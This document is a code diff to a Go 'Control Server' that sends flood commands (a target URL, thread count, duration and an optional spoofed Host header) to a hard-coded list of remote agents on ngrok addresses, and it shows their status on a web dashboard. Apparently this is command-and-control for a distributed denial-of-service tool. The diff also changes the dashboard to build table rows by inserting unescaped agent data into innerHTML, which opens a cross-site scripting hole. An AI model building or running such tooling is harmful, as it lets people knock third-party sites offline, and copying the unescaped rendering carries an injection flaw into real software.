@@ -12,10 +12,11 @@ import (
 )
 
 type Command struct {
-	Action  string `json:"action"`  // "start"
-	URL     string `json:"url"`     // Target URL
-	Threads int    `json:"threads"` // Number of threads
-	Timer   int    `json:"timer"`   // Duration in seconds
+	Action     string `json:"action"`      // "start"
+	URL        string `json:"url"`         // Target URL
+	Threads    int    `json:"threads"`     // Number of threads
+	Timer      int    `json:"timer"`       // Duration in seconds
+	CustomHost string `json:"custom_host"` // Optional custom Host header
 }
 
 type AgentStatus struct {
@@ -29,13 +30,11 @@ var agents = []string{
 	"https://humble-muskrat-reliably.ngrok-free.app",
 	"https://tidy-notably-vervet.ngrok-free.app",
 	"https://moved-miserably-oryx.ngrok-free.app",
-	// Add more agents here
 }
 
 var mu sync.Mutex
 var agentStatuses = make(map[string]AgentStatus)
 
-// Send command to an agent
 func sendCommandToAgent(agentURL string, cmd Command) error {
 	body, err := json.Marshal(cmd)
 	if err != nil {
@@ -55,7 +54,6 @@ func sendCommandToAgent(agentURL string, cmd Command) error {
 	return nil
 }
 
-// Ping agent to update its status
 func pingAgent(agentURL string) {
 	resp, err := http.Get(agentURL + "/status")
 	mu.Lock()
@@ -86,7 +84,6 @@ func pingAgent(agentURL string) {
 	}
 }
 
-// Periodically update agent statuses
 func monitorAgents() {
 	for {
 		for _, agent := range agents {
@@ -96,7 +93,6 @@ func monitorAgents() {
 	}
 }
 
-// Serve agent statuses as JSON
 func serveAgentStatuses(w http.ResponseWriter, r *http.Request) {
 	mu.Lock()
 	defer mu.Unlock()
@@ -105,7 +101,6 @@ func serveAgentStatuses(w http.ResponseWriter, r *http.Request) {
 	json.NewEncoder(w).Encode(agentStatuses)
 }
 
-// Render web interface
 func renderInterface(w http.ResponseWriter, r *http.Request) {
 	tmpl := `
 <!DOCTYPE html>
@@ -117,115 +112,63 @@ func renderInterface(w http.ResponseWriter, r *http.Request) {
     <style>
         body, html {
             font-family: 'Arial', sans-serif;
-            margin: 0;
-            padding: 0;
             background-color: #1a1a1a;
             color: #f4f4f9;
-            height: 100%;
             display: flex;
             justify-content: center;
             align-items: flex-start;
+            margin: 0;
         }
         .main-container {
             width: 90%;
             max-width: 800px;
             margin-top: 20px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
         }
         .container {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            width: 100%;
             background-color: #262626;
             padding: 20px;
             border-radius: 10px;
-            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.4);
             margin-bottom: 20px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.4);
         }
-        form {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            width: 100%;
-        }
-        input[type="text"], input[type="number"], button {
-            width: 90%;
+        input, button {
             padding: 10px;
             margin: 10px 0;
             border: 1px solid #555;
             border-radius: 5px;
-            background-color: #1a1a1a;
+            width: 90%;
             color: #f4f4f9;
+            background-color: #1a1a1a;
         }
         button {
-            width: 80%;
-            padding: 10px;
-            margin: 10px 0;
-            border: 1px solid #555;
-            border-radius: 5px;
             background-color: #007bff;
             color: #fff;
-            font-weight: bold;
             cursor: pointer;
-            transition: background-color 0.3s ease;
-        }
-        button:hover {
-            background-color: #0056b3;
-        }
-        h1, h2 {
-            color: #f4f4f9;
         }
         table {
             width: 100%;
-            color: #f4f4f9;
-            text-align: left;
-            border-collapse: collapse;
+            margin-top: 10px;
         }
-        table th, table td {
+        th, td {
             padding: 8px;
+            text-align: left;
             border: 1px solid #555;
-        }
-        table th {
-            background-color: #333;
         }
     </style>
     <script>
         async function fetchAgentStatuses() {
-            try {
-                const response = await fetch('/agent-statuses');
-                const data = await response.json();
-
-                const tbody = document.querySelector('.agent-status tbody');
-                tbody.innerHTML = '';
-
-                for (const [url, status] of Object.entries(data)) {
-                    const row = document.createElement('tr');
-
-                    const urlCell = document.createElement('td');
-                    urlCell.textContent = url;
-                    row.appendChild(urlCell);
-
-                    const statusCell = document.createElement('td');
-                    statusCell.textContent = status.Status;
-                    row.appendChild(statusCell);
-
-                    const onlineCell = document.createElement('td');
-                    onlineCell.textContent = status.Online ? 'Online' : 'Offline';
-                    row.appendChild(onlineCell);
-
-                    const lastPingCell = document.createElement('td');
-                    lastPingCell.textContent = new Date(status.LastPing).toLocaleString();
-                    row.appendChild(lastPingCell);
-
-                    tbody.appendChild(row);
-                }
-            } catch (error) {
-                console.error('Failed to fetch agent statuses:', error);
+            const response = await fetch('/agent-statuses');
+            const data = await response.json();
+            const tbody = document.querySelector('tbody');
+            tbody.innerHTML = '';
+            for (const [agent, info] of Object.entries(data)) {
+                const row = '<tr>' +
+                            '<td>' + agent + '</td>' +
+                            '<td>' + (info.Online ? 'Online' : 'Offline') + '</td>' +
+                            '<td>' + info.Status + '</td>' +
+                            '<td>' + new Date(info.LastPing).toLocaleString() + '</td>' +
+                            '</tr>';
+                tbody.innerHTML += row;
             }
         }
         setInterval(fetchAgentStatuses, 5000);
@@ -237,36 +180,26 @@ func renderInterface(w http.ResponseWriter, r *http.Request) {
         <div class="container">
             <h1>Control Server</h1>
             <form method="POST" action="/command">
-                <label for="url">Target URL:</label>
-                <input type="text" name="url" id="url" placeholder="Enter the target URL" required>
-                
-                <label for="threads">Threads:</label>
-                <input type="number" name="threads" id="threads" placeholder="Number of threads" required>
-                
-                <label for="timer">Timer (seconds):</label>
-                <input type="number" name="timer" id="timer" placeholder="Duration in seconds" required>
-                
-                <button type="submit">Start Test</button>
+                <input type="text" name="url" placeholder="Target URL" required>
+                <input type="number" name="threads" placeholder="Threads" required>
+                <input type="number" name="timer" placeholder="Timer (seconds)" required>
+                <input type="text" name="custom_host" placeholder="Custom Host (optional)">
+                <button type="submit">Start</button>
             </form>
         </div>
-
         <div class="container">
             <h2>Agent Status</h2>
-            <div class="agent-status">
-                <table>
-                    <thead>
-                        <tr>
-                            <th>Agent</th>
-                            <th>Status</th>
-                            <th>Online</th>
-                            <th>Last Ping</th>
-                        </tr>
-                    </thead>
-                    <tbody>
-                        <!-- Data dynamically filled here by the frontend -->
-                    </tbody>
-                </table>
-            </div>
+            <table>
+                <thead>
+                    <tr>
+                        <th>Agent</th>
+                        <th>Online</th>
+                        <th>Status</th>
+                        <th>Last Ping</th>
+                    </tr>
+                </thead>
+                <tbody></tbody>
+            </table>
         </div>
     </div>
 </body>
@@ -279,7 +212,6 @@ func renderInterface(w http.ResponseWriter, r *http.Request) {
 	tmplParsed.Execute(w, nil)
 }
 
-// Handle commands from the web interface
 func handleCommand(w http.ResponseWriter, r *http.Request) {
 	if r.Method != http.MethodPost {
 		http.Error(w, "Invalid method", http.StatusMethodNotAllowed)
@@ -287,27 +219,23 @@ func handleCommand(w http.ResponseWriter, r *http.Request) {
 	}
 
 	url := r.FormValue("url")
-	threads := r.FormValue("threads")
-	timer := r.FormValue("timer")
-
-	threadsInt, _ := strconv.Atoi(threads)
-	timerInt, _ := strconv.Atoi(timer)
+	threads, _ := strconv.Atoi(r.FormValue("threads"))
+	timer, _ := strconv.Atoi(r.FormValue("timer"))
+	customHost := r.FormValue("custom_host")
 
 	cmd := Command{
-		Action:  "start",
-		URL:     url,
-		Threads: threadsInt,
-		Timer:   timerInt,
+		Action:     "start",
+		URL:        url,
+		Threads:    threads,
+		Timer:      timer,
+		CustomHost: customHost,
 	}
 
-	// Send the command to all agents
 	for _, agent := range agents {
 		go func(agent string) {
 			err := sendCommandToAgent(agent, cmd)
 			if err != nil {
 				fmt.Printf("Failed to send command to %s: %v\n", agent, err)
-			} else {
-				fmt.Printf("Command sent to %s successfully\n", agent)
 			}
 		}(agent)
 	}
